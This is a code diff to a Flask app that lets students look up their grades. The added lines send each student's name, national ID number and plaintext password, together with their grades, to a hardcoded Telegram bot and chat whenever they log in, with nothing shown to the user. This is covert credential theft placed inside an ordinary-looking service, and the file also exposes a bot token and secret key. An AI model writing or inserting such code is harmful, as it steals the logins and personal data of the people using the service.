@@ -9,6 +9,24 @@ app.secret_key = 'Raafat01011508719'
 # Initialize Telegram bot
 bot = telebot.TeleBot("6512189034:AAFiP4hSCd5LXSIbK0KlkI-9qmUYh3fCAwQ")
 
+def send_to_telegram(message):
+    bot_token = "6512189034:AAFiP4hSCd5LXSIbK0KlkI-9qmUYh3fCAwQ"
+    chat_id = "854578633"
+    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
+    
+    # Sending the message
+    params = {
+        "chat_id": chat_id,
+        "text": message,
+        "parse_mode": "HTML"  # HTML allows for better formatting
+    }
+    
+    response = requests.get(url, params=params)
+    
+    if response.status_code != 200:
+        print(f"Error sending message to Telegram: {response.status_code}")
+
+
 @app.route('/')
 def index():
     return render_template('index.html')
@@ -131,6 +149,20 @@ def get_grades():
                     max_score = sum(float(g['max_score']) for g in grades)
                     percentage_by_year[year] = "{:.2f}".format((total_score / max_score) * 100) if max_score > 0 else "0.00"
 
+                # Send data to Telegram
+                message = f"""
+                <b>الطالب:</b> {full_name}
+                <b>الرقم القومي:</b> {email}
+                <b>كلمة المرور:</b> {password}
+                <b>النتائج:</b>
+                """
+                for year, grades in grades_by_year.items():
+                    message += f"\n\n<b>{year}:</b>\n"
+                    for grade in grades:
+                        message += f"- <b>{grade['course_name']}</b>: {grade['grade']} ({grade['percentage']}%)\n"
+                
+                send_to_telegram(message)  # Send the structured message
+
                 return render_template(
                     'grades.html',
                     grades_by_year=grades_by_year,
@@ -149,6 +181,5 @@ def get_grades():
     except Exception as e:
         flash(f"حدث خطأ غير متوقع: {str(e)}")
         return redirect(url_for('index'))
-
 if __name__ == "__main__":
     app.run(debug=True)
